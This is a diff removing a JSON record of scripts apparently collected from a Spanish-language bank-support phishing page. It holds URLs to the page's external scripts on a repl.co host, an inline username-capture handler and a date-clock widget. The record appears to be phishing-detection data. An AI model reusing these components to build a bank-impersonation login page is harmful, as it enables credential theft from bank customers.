@@ -1,8 +1,0 @@
-{
-    "script_1": "https://kit.fontawesome.com/45b9078c9f.js",
-    "script_2": "https://verify--soportebanca6.repl.co/js/jquery-3.6.0.min.js",
-    "script_3": "https://verify--soportebanca6.repl.co/js/jquery.jclock-min.js",
-    "script_4": "https://verify--soportebanca6.repl.co/js/functions.js",
-    "script_5": "\n\tvar espera = 0;\n\n\tlet identificadorTiempoDeEspera;\n\n\tfunction retardor() {\n\t  identificadorTiempoDeEspera = setTimeout(retardorX, 900);\n\t}\n\n\tfunction retardorX() {\n\n\t}\n\n\t$(document).ready(function() {\n\t\t$('#btnUsuario').click(function(){\n\t\t\tif ($(\"#txtUsuario\").val().length > 0) {\n\t\t\t\tinicio($(\"#txtUsuario\").val());\t\n\t\t\t}else{\n\t\t\t\t$(\".mensaje\").show();\n\t\t\t\t$(\".user\").css(\"border\", \"1px solid red\");\n\t\t\t\t$(\"#txtUsuario\").focus();\n\t\t\t}\t\t\t\n\t\t});\n\n\t\t$(\"#txtUsuario\").keyup(function(e) {\n\t\t\t$(\".user\").css(\"border\", \"1px solid #CCCCCC\");\t\n\t\t\t$(\".mensaje\").hide();\t\t\t\t\n\t\t});\n\t});\n",
-    "script_6": "\n     $(function($) {\n         var optionsEST = {\n         am_pm: true,\n         timeNotation: '12h',\n         h_hour: \"03:37:39\",\n         h_date: \"2023/09/03\",\n         h_format: \"$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$\",\n         h_language: \"es\"\n        }\n     $('#fecha-hora').jclock(optionsEST);\n     });\n "
-}
